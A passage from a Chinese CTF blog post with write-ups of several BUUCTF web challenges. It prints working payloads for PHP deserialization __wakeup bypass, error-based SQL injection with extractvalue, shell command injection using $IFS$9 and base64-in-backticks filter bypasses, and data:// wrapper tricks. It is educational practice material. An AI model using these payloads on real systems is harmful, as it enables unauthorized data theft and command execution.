class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &apos;nonono&apos;;</span><br><span class="line">    private $password = &apos;yesyes&apos;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username = &apos;guest&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password != 100) &#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username === &apos;admin&apos;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&apos;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+拿到falg的关键就是绕过<strong>wakeup和成功执行</strong>destruct函数拿到flag。<br>一开始我以为这道题是直接反序列化然后修改类成员数量绕过__wakeup函数的。<br>试了一下发现不行。是可爱的新知识，就看了一下。<br>问题在于这里的username和password都是私有变量。<br>这里推一下大佬写的好文 <a href="https://xz.aliyun.com/t/6753" target="_blank" rel="noopener">传送门</a><br>先来看看成员都为public情况下的序列化输出：<br><img src="https://i.loli.net/2020/03/14/WFQ4MDXcLIUNzwu.png" alt="Snipaste_2020-03-14_21-50-59.png"><br>序列化的时候，protect和private成员会有点不一样。</li>
+<li>private分析<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
+可以看到Nameusername长度为14，但是你数一下发现其实只有12.这是因为在类名和成员名前都加了%00.%00占了一个字节。<blockquote>
+<p>private属性序列化的时候格式是%00类名%00成员名</p>
+</blockquote>
+</li>
+<li>protecedt分析(将上面代码的成员类型改成protected测试)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:11:&quot;*username&quot;;s:5:&quot;admin&quot;;s:11:&quot;*password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
+对比private,在成员名前没有加列名。但是多了个*。一数还是发现问题了，少了两个字节没有了。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">实际上是在*的前后都加上了%00。也就是%00*%00成员名</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>protect属性序列化的时候格式是%00*%00成员名<br>这样的话传参的时候要把%00加上才能成功。<br>__wakeup函数的话只要序列化里面的成员数多于实际成员数就会跳过不执行。<br>最后构造了如下payload</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://8f277190-9a64-4793-a15a-c6be9f34d2f6.node3.buuoj.cn/?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="总结-17"><a href="#总结-17" class="headerlink" title="总结"></a>总结</h3>这道题虽然看起来不难但是还是有收获的。对php的序列化更加清楚了。<br>序列化后的格式也能看懂了(再次谢谢那位大佬，写得一手好文)。<br>对不同类型的成员的格式化学习应该是本题的大收获了。谢谢招待。<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2>知识点</li>
+<li>报错注入<br>本题进去还是一个登录页面。<br>fuzz一下发现用户名处有注入点。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名 &apos; or &apos;1&apos; or &apos;1        密码随便填</span><br></pre></td></tr></table></figure>
+发现成功登录，给了admin的密码，不过是md5加密的。<br>鉴于本题给了提示说“把密码放在了那个地方”，估计是放数据库里面了。<br>看一下表名<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; or extractvalue(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema=database())))#</span><br></pre></td></tr></table></figure>
+发现了geekuser和l0ve1ysq1两个表。<br>看一下列名<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; or extractvalue(1,concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name=&apos;l0ve1ysq1&apos;)))#</span><br></pre></td></tr></table></figure>
+两个表都是三列,id,username,password.<br>再看id<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; or extractvalue(1,concat(0x7e, (select group_concat(id) from geekuser)))#</span><br></pre></td></tr></table></figure>
+geekuser只有一行。l0ve1ysq1倒是有很多行数据导致超过了报错输出的最大长度。<br>配合使用了substr函数分两次获取了id。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; or extractvalue(1,concat(0x7e, (substr((select group_concat(id) from l0ve1ysq1),1,30))))#</span><br></pre></td></tr></table></figure>
+发现有16条记录。<br>看看用户名，还是配合substr函数使用<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; or extractvalue(1,concat(0x7e, (substr((select group_concat(username) from l0ve1ysq1),90,30))))#</span><br></pre></td></tr></table></figure>
+发现flag在最后。<br>直接获取flag，不过flag太长了，还是配合substr函数分两次取了出来<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; or extractvalue(1,concat(0x7e, (substr((select password from l0ve1ysq1 limit 15,1),1,30))))#</span><br></pre></td></tr></table></figure>
+到此拿到flag<h3 id="总结-18"><a href="#总结-18" class="headerlink" title="总结"></a>总结</h3>本题对于我来说更大的意义应该是熟悉了sql语句。更熟练的掌握了substr在报错注入的配合使用。<br>而且还注意到了group_concat貌似不能和limit共用，不然报错注入不成功(再最后取flag的时候发现的)<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2>知识点</li>
+<li>命令执行</li>
+<li>空格绕过</li>
+<li>黑名单绕过</li>
+</ul>
+<hr>
+<p>进去后会提示你提交一个ip。加上题目就叫ping。<br>提交一个127.0.0.1试试。ok成功了。试试看执行别的命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;ls /</span><br></pre></td></tr></table></figure>
+<p>发现过滤了空格，搜一下空格绕过，发现了大佬的好文 <a href="https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" target="_blank" rel="noopener">传送门</a><br>简直涵盖了整个这道题考察的内容，爱了。<br>空格过滤的绕过技巧：</p>
+<ul>
+<li>${IFS}</li>
+<li>$IFS$9</li>
+<li>${IFS}$9</li>
+<li>&lt;&gt;</li>
+<li>&lt;<br>本题过滤了{}和&lt;&gt;，那就直接用$IFS$9绕过就行了。<br>先看看当前目录下有什么文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;ls</span><br></pre></td></tr></table></figure>
+发现有index.php和flag.php两个文件<br>直接试试读取flag.php<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS$9flag.php</span><br></pre></td></tr></table></figure>
+发现flag被过滤了，尝试用cat$IFS$9????.php发现?也被过滤了。<br>读取index.php试试<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS$9index.php</span><br></pre></td></tr></table></figure>
+读出来了，源码如下(这里有个小坑，源码不会完全回显出来，要ctrl+u查看源码才能看到完整源码，后面还要坑一遍)<br><img src="https://i.loli.net/2020/03/15/KxSF3rUT9YHm4h8.png" alt="Snipaste_2020-03-15_13-16-01.png"><br>可以看到过滤了什么，比如符号，空格，还有ip参数的值不能有flag的排序(gfla是允许的，后面可以用拼接的方法绕过)。<br>到这里咱不会了。那就回去看大佬的文章，果然有黑名单绕过</li>
+<li>拼接法，例如a=g;b=fla;cat $b$a.php</li>
+<li>利用已存在的资源,从已存在的文件或环境变量里获取相应的字符</li>
+<li>base64编码</li>
+<li>单引号，双引号，例如 c””at flag</li>
+<li>反斜线，例如 c\at fl\ag<br>因为这道题过滤了单双引号和反斜线。尝试用变量拼接和base64的办法绕过<br>看看变量拼接法：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;a=lag;b=f;cat$IFS$9$b$a.php</span><br></pre></td></tr></table></figure>
+发现好像失败了！但是又没有报错？<br><img src="https://i.loli.net/2020/03/15/8dbZkVW4XeJ76lD.png" alt="Snipaste_2020-03-15_13-32-33.png"><br>这里让我一度以为自己构造错了。<br>直到我查看源码：<br><img src="https://i.loli.net/2020/03/15/ymXaBMdU8rePCNY.png" alt="Snipaste_2020-03-15_13-34-02.png"><br>emmm(说两句脏话)<br>再试试大佬的base64编码法：<br>先把cat flag.php编码Y2F0IGZsYWcucGhw<br>再构造一下payload<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;`echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d`</span><br></pre></td></tr></table></figure>
+也成功了。<br>但是这里这条命令有点模糊，查查看执行的流程到底咋回事。<br>由于对``这东西的用法不太熟，我还查了一下是怎么用的。<br>大概意思就是会把``包裹的内容当成命令来先执行，再拼接到原语句上继续执行<br>例如 echo `cat flag`会先把cat flag先执行，如果flag里的内容是irrik。<br>就相当于执行了 echo irrik。<br>回到这条命令上。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d`</span><br></pre></td></tr></table></figure>
+首先执行echo 9Y2F0IGZsYWcucGhw。然后9Y2F0IGZsYWcucGhw作为base64 -d的输入，解码结果也就是cat flag.php<br>然后整个cat flag.php再执行，这样就查看到了flag.php里面的内容。<br>不过我尝试直接`base64 -d Y2F0IGZsYWcucGhw`失败了。<br>看了下base64用法，应该是因为我直接手动输入不是标准输入的原因，用echo的输出结果才是标准输入对象。<br>不过这里弄清了命令的执行流程也算可以了吧。</li>
+</ul>
+<hr>
+<h3 id="总结-19"><a href="#总结-19" class="headerlink" title="总结"></a>总结</h3><p>一开始吧，在用base64编码的时候我其实是不会的。然后打开了虚拟机自己在虚拟终端上试了试。<br>发现我一开始编码错了，只把flag.php编码，没有整个把cat flag.php编码。<br>搞来搞去最后还是把命令执行的流程弄清楚了，尤其是学到了不少绕过知识。<br>对了，还学了$的用处，至少知道这个符号是有特殊意义的。<br>虚拟终端下，单引号和双引号的不同其实也看了，有点像php啊哈哈，单引号不会尝试解析变量，而双引号会尝试解析变量。<br>例如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=irrik</span><br><span class="line">echo &quot;$a&quot; //irrik</span><br><span class="line">echo &apos;$a&apos; //$a</span><br></pre></td></tr></table></figure>
+<p>还学习了反引号的用法，挺满足的。谢谢招待。</p>
+<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>知识点:</p>
+<ul>
+<li>data伪协议</li>
+<li>反序列化<br>进去直接给了源码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$password = $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&apos;r&apos;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&apos;r&apos;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  //useless.php</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+if条件的绕过前面bjd的一题有讲到两种方法，一种是data伪协议，一种是利用php://input绕过。<br>这里直接用php://filter包含useless.php读源码看看<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+一看是反序列化，本地自己构造一下。得到序列化对象，打上去就行了。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+这里需要说一下的是__tostring()这个魔术方法，当被反序列化的对象被输出时才会被调用到。<br>一开始的源码里有把我们打上去的$password给反序列化然后输出。echo的时候调用了这个魔术方法。<br>最终的payload如下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://84f124e9-5abf-43ed-9fc0-924b25a69dfb.node3.buuoj.cn/?file=useless.php&amp;text=data://text/plain,welcome%20to%20the%20zjctf&amp;password=O:4:%22Flag%22:1:&#123;s:4:%22file%22;s:8:%22flag.php%22;&#125;</span><br></pre></td></tr></table></figure>
+flag在源码里面不回显出来。(碰到几次了)<h3 id="总结-20"><a href="#总结-20" class="headerlink" title="总结"></a>总结</h3>本题的知识点除了__tostring魔术方法之外好像没新的了，记录一下就当复习了吧。<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2>知识点</li>
+<li>报错注入</li>
+<li>非递归替换</li>
+</ul>
+<hr>
+<p>进去还是那个熟悉的登录界面<br>随便’试一下发现还是存在注入。<br>尝试的过程中发现过滤了如下关键字<br><code>select or and substr where from</code><br>过滤了这么多会不会是堆叠注入？试了一下发现不是。<br>尝试用大小写的方法绕过，失败。<br>尝试用oorr的方法绕过or的过滤，成功了。<br>由此猜测后端在将参数拼入sql语句前对以上关键字进行了replace操作，但是没有递归检查，导致出现了注入。<br>既然知道了方法就直接老办法报错注入就行了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; oorr extractvalue(1, concat(0x7e, (selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database())))#  //查表</span><br><span class="line">admin&apos; oorr extractvalue(1, concat(0x7e, (selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&apos;b4bsql&apos;)))# //查列名</span><br><span class="line">admin&apos; oorr extractvalue(1, concat(0x7e, (selselectect group_concat(username) frfromom b4bsql)))# //爆数据</span><br><span class="line">admin&apos; oorr extractvalue(1, concat(0x7e, subssubstrtr((selselectect group_concat(username) frfromom b4bsql),30,30)))# //爆数据</span><br><span class="line">admin&apos; oorr extractvalue(1, concat(0x7e, subsubstrstr((selselectect passwoorrd frfromom b4bsql limit 7,1),25,30)))# //拿flag</span><br></pre></td></tr></table></figure>
+<p>这道题是手动注入的，主要是为了让自己更加熟悉sql语句的查询。主要的时间花在了尝试上面。<br>尤其是一开始没注意到过滤了substr浪费了点时间。<br>还有忘了from 后面的表名不需要引号括起来。</p>
+<h2 id="总结-21"><a href="#总结-21" class="headerlink" title="总结"></a>总结</h2><p>本题主要还是思路的考察吧。一开始没想到是非递归过滤的问题。<br>由于是第一次遇到这类题型不太熟悉做题方法花了更多的时间。<br>万幸是还是做出来了。也算是收获了一种新的题型做题方法。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/06/scan/" rel="next" title="scan">
+                <i class="fa fa-chevron-left"></i> scan
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/02/16/exploit/" rel="prev" title="exploit">
+                exploit <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg"
+                alt="irrik" />
+            
+              <p class="site-author-name" itemprop="name">irrik</p>
+              <p class="site-description motion-element" itemprop="description">又菜又爱玩</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/irrik" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#basic"><span class="nav-number">1.</span> <span class="nav-text">basic</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#BUU-CODE-REVIEW1"><span class="nav-number">1.1.</span> <span class="nav-text">BUU CODE REVIEW1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">1.1.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BUU-SQL-COURSE1"><span class="nav-number">1.2.</span> <span class="nav-text">BUU SQL COURSE1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#查看返回的列数"><span class="nav-number">1.2.1.</span> <span class="nav-text">查看返回的列数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#使用union-select直接测试"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">使用union select直接测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用order-by语句"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">使用order by语句</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查数据库"><span class="nav-number">1.2.2.</span> <span class="nav-text">查数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查表名"><span class="nav-number">1.2.3.</span> <span class="nav-text">查表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查列名"><span class="nav-number">1.2.4.</span> <span class="nav-text">查列名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提取数据"><span class="nav-number">1.2.5.</span> <span class="nav-text">提取数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-1"><span class="nav-number">1.2.6.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">2.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#HCTF-2018-WarmUP"><span class="nav-number">2.1.</span> <span class="nav-text">[HCTF 2018]WarmUP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-2"><span class="nav-number">2.1.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN-2019初赛-Love-Math"><span class="nav-number">2.2.</span> <span class="nav-text">[CISCN 2019初赛] Love Math</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-3"><span class="nav-number">2.2.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BUUCTF-2018-Online-Tool"><span class="nav-number">2.3.</span> <span class="nav-text">BUUCTF 2018 Online Tool</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-4"><span class="nav-number">2.3.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hack-World"><span class="nav-number">2.4.</span> <span class="nav-text">Hack World</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-5"><span class="nav-number">2.4.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CyberPunk"><span class="nav-number">2.5.</span> <span class="nav-text">CyberPunk</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-6"><span class="nav-number">2.5.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#强网杯2019随便注"><span class="nav-number">2.6.</span> <span class="nav-text">强网杯2019随便注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-7"><span class="nav-number">2.6.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUCTF-2019-EasySQL"><span class="nav-number">2.7.</span> <span class="nav-text">[SUCTF 2019]EasySQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-EasySQL"><span class="nav-number">2.8.</span> <span class="nav-text">[极客大挑战 2019]EasySQL</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-8"><span class="nav-number">2.8.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF2020-Easy-MD5"><span class="nav-number">2.9.</span> <span class="nav-text">[BJDCTF2020]Easy MD5</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-9"><span class="nav-number">2.9.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF2020-Mark-loves-cat"><span class="nav-number">2.10.</span> <span class="nav-text">[BJDCTF2020]Mark loves cat</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-10"><span class="nav-number">2.10.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF2020-The-mystery-of-ip"><span class="nav-number">2.11.</span> <span class="nav-text">[BJDCTF2020]The mystery of ip</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-11"><span class="nav-number">2.11.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF2020-ZJCTF，不过如此"><span class="nav-number">2.12.</span> <span class="nav-text">[BJDCTF2020]ZJCTF，不过如此</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-12"><span class="nav-number">2.12.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#护网杯-2018-easy-tornado"><span class="nav-number">2.13.</span> <span class="nav-text">[护网杯 2018]easy_tornado</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-13"><span class="nav-number">2.13.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#强网杯-2019-高明的黑客"><span class="nav-number">2.14.</span> <span class="nav-text">[强网杯 2019]高明的黑客</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-14"><span class="nav-number">2.14.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUCTF-2019-CheckIn"><span class="nav-number">2.15.</span> <span class="nav-text">[SUCTF 2019]CheckIn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-15"><span class="nav-number">2.15.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-Secret-File"><span class="nav-number">2.16.</span> <span class="nav-text">[极客大挑战 2019]Secret File</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-16"><span class="nav-number">2.16.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item 